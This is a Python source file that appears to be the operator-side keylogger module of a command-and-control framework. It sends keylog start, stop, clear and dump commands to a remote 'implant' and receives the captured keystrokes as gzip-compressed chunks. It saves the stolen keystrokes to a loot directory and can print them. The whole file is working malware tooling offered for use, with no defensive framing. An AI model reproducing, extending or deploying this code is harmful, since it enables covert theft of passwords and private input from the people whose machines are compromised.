import os
import time

from base64 import b64decode
from gzip import decompress as degzip
from common import bcolors as bc

def parse_args(agent, args=None):
    #Initial argument setup
    start = False
    dump = False
    kill = False
    clear = False
    show = False
    settings = {}

    #Get (any) raw args
    if args:
        args = args.split(' ')
        for arg in args:
            if arg == '--start' or arg == '-s':
                start = True
            if arg == '--dump' or arg == '-d':
                dump = True
            if arg == '--kill' or arg == '-k':
                kill = True
            if arg == '--clear' or arg == '-c':
                clear = True
            if arg == '--show' or arg == '-v':
                show = True


    #rationalise and test arguments into settings dict
    settings['start'] = True if start else False
    settings['dump'] = True if dump else False
    settings['kill'] = True if kill else False
    settings['clear'] = True if clear else False
    settings['show'] = True if show else False

    return settings

def get_keylog_dump(agent, show = False):
    try:
        #Setup out-file
        timestamp = time.strftime("-%Y-%m-%d-%H%M%S")
        file_name = agent.listener.loot_dir + 'keylog' + '-' + agent.name + timestamp + '.txt'
        #receive the file!
        raw_bytes = b''
        while True:
            chunk = agent.recv(print_flag=False, blocking=False)
            try:
                if not chunk:
                    #bc.info("Empty chunk, passing")
                    continue
                if chunk.endswith(b'<BSEOF>'):
                    chunk = chunk[:-7]
                    raw_bytes += chunk
                    break
                elif b'BSEOF' in chunk:
                    bc.err('Dump failed, unexpected EOF location in:\n{}.'.format(chunk))
                    raise ValueError("Out of place <BSEOF>")
                    break  #It's all over now
                else:
                    raw_bytes += chunk
                    #Status info
            except Exception as e:
                bc.err("Keylog dump chunk failed because : {}. Try again?".format(e))
                return
            #gracefully stop download operation
            finally:
                chunk = ''
        #REconstruct the image from raw raw bytes
        dump = degzip(raw_bytes)
        with open(file_name, 'w') as f:
            f.write(dump.decode())
        bc.green_print("\n[+] ", "{} - Keylog dump saved to : {}".format(agent.name, file_name))
        if show:
            bc.success("{} keylog data:\n".format(agent.name), False)
            print(dump.decode())
        return True
    except Exception as e:
                bc.err_print("\n[!] ", "{} Keylog dump failed : {}".format(agent.name, e))
                return False


def main(agent, args=None):
    try:
        #get settings
        #bc.info("gitting the settings now: {}".format(args))
        settings = parse_args(agent, args)
        if not settings:
            bc.warn("Error parsing arguments, settings : {}".format(settings))
            return
        #Check Settings
        if settings['show'] and not settings['dump']:
            bc.warn("Cannot show keylog dump without --dump (-d) command")
            return
        if settings['dump'] and (settings['start'] or settings['kill']):
            bc.warn("Cannot dump alongside start/stop operations.")
            return
        #Get the agent to do the thing
        agent.send('keylog ' + str(args))

        if settings['dump']:
            if get_keylog_dump(agent, settings['show']):
                agent.recv(print_flag=True, blocking=True)
            else:
                #Warning already printed
                bc.err("Failed dump, getting message from implant")
                agent.recv(print_flag=True, blocking=True)
                return
        else:
            agent.recv(print_flag=True)
    except Exception as e:
        bc.err("Exception in agent {} keylogger : {}".format(agent.name, e))
